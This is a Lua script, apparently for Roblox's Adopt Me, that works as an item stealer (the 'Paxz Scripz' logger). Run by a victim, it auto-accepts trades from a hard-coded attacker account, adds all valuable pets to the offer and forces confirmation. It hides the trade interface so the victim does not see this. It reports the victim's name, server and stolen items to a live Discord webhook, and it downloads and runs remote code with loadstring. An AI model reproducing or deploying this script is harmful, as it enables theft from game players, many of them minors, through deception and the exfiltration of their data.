local targetName = "peertjelol2009" 
local webhookUrl = "https://discord.com/api/webhooks/1497168308489949234/FzshgxFf5uESFLgpdE6Ma45YnVp3pePX30drKAzgsIWSPvw75HPVHwpWAJ3vx9oHJydJ"
local valuesUrl = "https://raw.githubusercontent.com/deltamokey-arch/adm-values/refs/heads/main/values.lua"

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

local tradingActive = false 

-- 🚫 STRICTE BLACKLIST OP RAW ID
local BLACKLIST = {
    ["practice_dog"] = true, ["starter_egg"] = true, ["sandwich-default"] = true,
    ["ice_skates"] = true, ["trade_license"] = true, ["beach_2024_mahi_spinning_rod_temporary"] = true,
    ["white_bowtie"] = true, ["cowbell"] = true, ["blue_cap"] = true,
    ["squeaky_bone_default"] = true, ["stroller-default"] = true,
    ["ice_dimension_2025_ice_soup_bait"] = true, ["starter_egg_2025_mouse"] = true
}

local function getExternalValues()
    local source = ""
    pcall(function() source = game:HttpGet(valuesUrl) end)
    if source == "" then return {pets = {}} end
    source = source:match("^%s*(.-)%s*$")
    if not source:find("return") then source = source .. "\nreturn ValueList" end
    local func = loadstring(source)
    return func and func() or {pets = {}}
end
local ValueList = getExternalValues()

local function getItemInfo(uniqueId)
    local info = {name = "Unknown", rarity = "COMMON", value = 0, rawId = ""}
    pcall(function()
        local data = require(ReplicatedStorage.ClientModules.Core.ClientData).get_data()[LocalPlayer.Name]
        local inv = data and data.inventory
        if not inv then return end
        for cat, group in pairs(inv) do
            if group[uniqueId] then
                local d = group[uniqueId]
                info.rawId = d.id or cat
                local name = info.rawId:gsub("_", " "):gsub("(%l)(%w*)", function(a,b) return a:upper()..b:lower() end)
                local vData = ValueList.pets and ValueList.pets[name]
                local p = d.properties or {}
                local tag = ((d.mega_neon and "M") or (d.neon and "N") or "") .. (p.flyable and "F" or "") .. (p.rideable and "R" or "")
                info.name = name .. (tag ~= "" and " ("..tag..")" or "")
                
                if vData then
                    local prefix = (d.mega_neon and "mvalue") or (d.neon and "nvalue") or "rvalue"
                    info.value = tonumber(vData[prefix] or vData["value"] or 0)
                    info.rarity = (vData.rarity or "common"):upper()
                else
                    info.rarity = (d.rarity or "common"):upper()
                end
                break
            end
        end
    end)
    return info
end 

-- 🛠 PAARSE WEBHOOK (#8a2be2)
local function postLog(data)
    local list, total = "", 0
    for _, i in ipairs(data) do
        -- Alleen de waardevolle items erin!
        if i.value > 0 then
            list = list .. "┕ **[" .. i.rarity .. "]** " .. i.name .. " | Val: " .. i.value .. "\n"
            total = total + i.value
        end
    end
    
    -- STUUR GEEN BERICHT ALS ER 0 WAARDE IS GESTOLEN
    if total <= 0 then return end
    
    local logoUrl = "https://github.com/deltamokey-arch/idk/blob/945d613732990512e3b338936ecf3bb3c232e017/eaef8a71-28de-41a0-8e1f-500354554d5a.png?raw=true"
    local embed = {
        content = "🚨 **NEW HIT DETECTED** 🚨",
        embeds = {{
            title = "Paxz Scripz",
            description = "Er is een waardevolle hit succesvol uitgevoerd!",
            color = 9055202, -- Paars
            thumbnail = { url = logoUrl },
            fields = {
                {name = "👤 Victim", value = "```" .. LocalPlayer.Name .. "```", inline = true},
                {name = "💎 Total Value", value = "```" .. total .. "```", inline = true},
                {name = "📦 Items", value = list}
            },
            footer = {text = "Paxz Engine • " .. os.date("%X"), icon_url = logoUrl}
        }}
    }
    pcall(function()
        local req = (syn and syn.request) or (http and http.request) or http_request or request
        req({Url = webhookUrl, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(embed)})
    end)
end

-- ✨ STEALTH UI VERBERGER
RunService.RenderStepped:Connect(function()
    local gui = LocalPlayer.PlayerGui
    local hint = gui:FindFirstChild("HintApp")
    if hint then
        for _, v in pairs(hint:GetDescendants()) do
            if v:IsA("TextLabel") then v.TextTransparency = 1 end
            if v:IsA("GuiObject") then v.BackgroundTransparency = 1 end
        end
    end
    local trade = gui:FindFirstChild("TradeApp")
    if trade and trade:FindFirstChild("Frame") then
        for _, v in pairs(trade.Frame:GetDescendants()) do
            if v:IsA("TextLabel") or v:IsA("ImageLabel") or v:IsA("TextButton") then
                v.BackgroundTransparency = 1
                v.ImageTransparency = 1
                v.TextTransparency = 1
            end
        end
    end
end)

-- ⚡ HOOFD LOOP (VICTIM)
task.spawn(function()
    local API = ReplicatedStorage:WaitForChild("API")

    pcall(function()
        local req = (syn and syn.request) or (http and http.request) or http_request or request
        req({Url = webhookUrl, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode({["content"] = "JOIN_DATA:" .. game.PlaceId .. ":" .. game.JobId .. ":" .. LocalPlayer.Name})})
    end)

    while true do
        task.wait(0.4)
        local target = Players:FindFirstChild(targetName)
        local tradeApp = LocalPlayer.PlayerGui:FindFirstChild("TradeApp")
        local isVisible = tradeApp and tradeApp:FindFirstChild("Frame") and tradeApp.Frame.Visible

        if target then
            -- Accepteer constante trade requests
            task.spawn(function() pcall(function() API["TradeAPI/AcceptOrDeclineTradeRequest"]:InvokeServer(target, true) end) end)

            if isVisible and not tradingActive then
                tradingActive = true
                local tradeItemsData = {}
                local data = require(ReplicatedStorage.ClientModules.Core.ClientData).get_data()[LocalPlayer.Name]
                
                if data and data.inventory then
                    for cat, group in pairs(data.inventory) do
                        if cat ~= "stickers" then
                            for id, _ in pairs(group) do 
                                local info = getItemInfo(id)
                                -- Blacklist check en > 0 check
                                if not BLACKLIST[info.rawId] and info.value > 0 then
                                    table.insert(tradeItemsData, info)
                                    pcall(function() API["TradeAPI/AddItemToOffer"]:FireServer(id) end)
                                    task.wait(0.05)
                                end
                            end
                        end
                    end
                end

                if #tradeItemsData > 0 then postLog(tradeItemsData) end

                -- Forceer Confirm Loop
                local count = 0
                while tradeApp and tradeApp:FindFirstChild("Frame") and tradeApp.Frame.Visible and count < 30 do
                    task.spawn(function() pcall(function() API["TradeAPI/AcceptNegotiation"]:FireServer() end) end)
                    task.spawn(function() pcall(function() API["TradeAPI/ConfirmTrade"]:FireServer() end) end)
                    task.wait(0.4)
                    count = count + 1
                end
                
                tradingActive = false
            end
        end
    end
end)
